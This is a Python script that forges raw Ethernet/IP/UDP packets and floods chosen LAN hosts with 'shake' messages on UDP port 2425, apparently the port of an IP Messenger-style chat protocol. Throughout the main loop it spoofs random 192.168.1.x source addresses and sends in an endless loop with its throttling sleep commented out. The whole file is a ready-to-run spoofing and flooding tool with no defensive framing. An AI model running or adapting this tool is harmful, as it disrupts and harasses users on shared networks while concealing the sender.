#Modified on Spt.6th.2o1o

import sys,random,time
import RapLanV1

def ShakeMePlainText():
    """Shake的UDP净荷(Plain text密文)"""
    #return "1_lbt4_0#128#001E8C97A9FB#0#0#0:1277922188:root:superman:209:" + '\0'  #Original#
    #return "1_lbt4_0#128#001E8C97A9FB#0#0#0:888:root:superman:209:" + '\0'
    return "1_lbt4_0#128#001C2C3C4C5C#0#0#0:888:root:superman:209:" + '\0'

def Shake6(dev1,targets):
    src_port = 2425
    dst_port = 2425
    
    from comac import CoMac,CoIPv4
    from comachd import CoMacIpHd,CoIpUdp,CoUdpHd,CoTcpUdpPacketRoot
    from coshake import Latin1ToHexStream,HexStreamToBytes    

    gmac = RapLanV1.SendArp('192.168.1.1')
    if gmac[0]:
        gmac = gmac[2]
    else:
        print("No mac for gateway.")
        quit(1)

    macs = {}
    def RetrieveMac(aim):
        if aim in macs.keys():
            return macs[aim]
        tp = RapLanV1.SendArp(aim)
        if tp[0]:
            macs[aim] = tp[2]
        if aim in [f['Address'] for f in dev1.Addresses]:
            macs[aim] = dev.PhysicalAddr
        if aim in macs.keys():
            return macs[aim]
        return None
        
    while True:
        dstIP = targets[random.randint(0,len(targets)-1)]
        dstmc = RetrieveMac(dstIP)
        if dstmc:
            mH = CoMacIpHd(CoMac(dstmc),CoMac(gmac))
            ipH = CoIpUdp("192.168.1.%d"%random.randint(2,254),dstIP)
            udpH = CoUdpHd(src_port,dst_port)
            packet =  CoTcpUdpPacketRoot(mH,ipH,udpH,Latin1ToHexStream(ShakeMePlainText()))
            dev1.Send( HexStreamToBytes( packet.toHexStream()) )
            print("From ",ipH.SourceIP(),"to",ipH.DestinationIP())
            #time.sleep(random.randint(133,766) / 1000)
            
    return "Completed"

if '__main__' == __name__:
    dev1 = RapLanV1.PcapIf(RapLanV1.AdList()[0])
    print(dev1.FriendlyName)
    print(dev1.AdDesc)

    tgs = sys.argv[1:]
    print( Shake6(dev1,tgs) )
    


    
